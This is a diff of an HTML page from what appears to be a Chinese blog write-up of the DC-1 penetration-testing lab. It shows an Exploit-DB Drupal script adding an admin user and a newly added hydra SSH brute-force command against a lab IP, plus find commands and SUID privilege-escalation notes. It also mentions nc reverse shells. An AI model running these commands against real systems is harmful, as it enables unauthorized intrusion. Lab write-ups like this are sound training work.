@@ -113,7 +113,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.138/ -u znskiw -p 123</span><br></pre></td></tr></table></figure>
 <p>我们就可以通过admin&#x2F;123或者znskiw&#x2F;123来登入我们刚刚一开始进入的那个网页，然后就能发现flag3了，flag3提示：<code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow. </code>,提示我们可以用find命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag4*</span><br><span class="line">cat /home/flag4/flag4.txt</span><br></pre></td></tr></table></figure>
-<p>得到flag4：<code>Can you use this same method to find or access the flag in root? Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code><br>要我们进入root，直接进显然没权限，我们使用<strong>SUID提权法</strong></p>
+<p>或者使用ssh爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.174.138 ssh</span><br><span class="line">-l:指定用户名</span><br><span class="line">-P:指定爆破的密码字典</span><br></pre></td></tr></table></figure>
+<p>爆破出来后连接ssh，cat flag4.txt即可<br>得到flag4：<code>Can you use this same method to find or access the flag in root? Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code><br>要我们进入root，直接进显然没权限，我们使用<strong>SUID提权法</strong></p>
 <p><strong>SUID提权法：</strong><br>在 Linux 中一切都是一个文件，而文件的权限有rwx（即读&#x2F;写&#x2F;执行），所有者、所有组、其它用户的rwx权限是彼此独立的。但是其实它还有第四类权限位，即SUID(Set UID)<br>SUID(Set UID)：</p>
 <ul>
 <li>suid权限仅对二进制程序有效（binary program）；</li>
@@ -146,7 +148,12 @@ linux一般都安装了nc 我们也可以利用nc 广播或反弹shell<figure cl
 
             
             <nav class="dis_flex al_post_nav">
-                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/05/21/%E6%B8%97%E9%80%8F%E7%BB%83%E4%B9%A0DC-2/">
+                    
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-left"></use>
+                        </svg>
+                        <span class="al_text_ellipsis al_post_nav_desc">渗透练习DC-2</span>
                     
                 </a>
                 <a class="al_post_nav_item dis_flex_acenter" href="/2023/04/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E7%BB%83%E4%B9%A0/">
